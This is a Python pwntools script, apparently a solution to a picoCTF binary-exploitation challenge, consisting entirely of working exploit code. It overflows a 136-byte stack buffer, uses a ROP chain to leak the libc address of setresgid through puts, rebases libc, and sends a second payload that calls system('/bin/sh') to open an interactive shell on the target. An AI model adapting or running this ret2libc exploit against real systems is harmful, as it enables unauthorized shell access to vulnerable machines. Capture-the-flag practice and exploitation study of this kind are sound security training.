from pwn import *

libc = ELF('libc.so.6')
binary = ELF('./vuln')

if not args.REMOTE:
    r = process(binary.path)
else:
    r = remote('mercury.picoctf.net', 1774)

rop = ROP(binary)
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
setresgid_offset = libc.symbols['setresgid']


r.recvuntil("sErVeR!\n")

payload1 = b'a' * 136
payload1 += p64(ret)
payload1 += p64(pop_rdi_ret)
payload1 += p64(binary.got['setresgid'])
payload1 += p64(binary.plt['puts'])
payload1 += p64(ret)
payload1 += p64(binary.symbols['do_stuff'])

r.sendline(payload1)
r.recvline()

leak_setresgid = r.recv(6) + b'\x00\x00'
print("Leaked setresgid: " + str(hex(u64(leak_setresgid))))

libc.address = u64(leak_setresgid) - setresgid_offset
bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']


payload2 = b'a'*136
payload2 += p64(ret)
payload2 += p64(pop_rdi_ret)
payload2 += p64(bin_sh)
payload2 += p64(system)

r.sendline(payload2)
r.interactive()